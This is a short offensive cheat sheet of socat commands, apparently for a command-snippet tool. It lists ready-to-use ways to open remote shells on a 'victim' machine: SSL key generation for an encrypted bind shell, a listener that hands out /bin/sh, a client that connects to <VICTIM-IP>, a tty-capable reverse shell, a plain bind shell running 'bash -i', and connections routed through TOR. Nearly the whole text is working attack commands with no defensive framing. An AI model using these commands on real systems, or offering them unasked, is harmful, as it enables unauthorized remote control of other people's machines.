# socat

## socat ssl protected bind-shell
### generate ssl key-pairs localy
``` cheat socat generates all keys for ssl bind-shell
echo -e "\n\n\n\n\n\n\n" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt && cat server.key server.crt > server.pem && openssl genrsa -out client.key 1024 && echo -e "\n\n\n\n\n\n\n" |openssl req -new -key client.key -x509 -days 3653 -out client.crt && cat client.key client.crt > client.pem && chmod 600 server.* && chmod 600 client.*
```
### transfer server.pem & client.cr to victiom

## spawn socat bind-shell
``` cheat socat create ssl bind-shell
socat OPENSSL-LISTEN:8433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
```

## connect to ssl bind-shell
``` cheat socat connet to ssl bind-shell
socat STDIO OPENSSL-CONNECT:<VICTIM-IP>:8433,cert=client.pem,cafile=server.crt,verify=0
```

## reverse Shell with tty support  run on victim
```cheat socat reverse Shell with tty support run on victim
socat -,raw,echo=0 tcp-listen:4545
socat tcp:127.0.0.1:4545 exec:"bash -i",pty,stderr,setsid,sigint,sane
```

## socat connect to TCP 4444
```cheat socat simple connect
socat -d  READLINE,history=$HOME/.socat_history TCP4:4444,crnl
```

## socat listen on TCP 443
```cheat socat listening
socat -d  READLINE,history=$HOME/.socat_history TCP-LISTEN:443,crnl,fork,reuseaddr,retry
```

## socat connect via SSL to TCP 8443
```cheat socat connect via SSL
socat -d  READLINE,history=$HOME/.socat_history OPENSSL:8443,verify=0,crnl
```

## socat listen via TOR 8443
```cheat socat listen via TOR
socat -d  READLINE,history=$HOME/.socat_history SOCKS4:127.0.0.1:8443,socksport=9050
```

## bind shell - on victim
```cheat socat bind shell - on victim
socat TCP-LISTEN:4444 exec:"bash -i",pty,stderr,setsid,sigint,sane
```


tags: socat shell connect listen
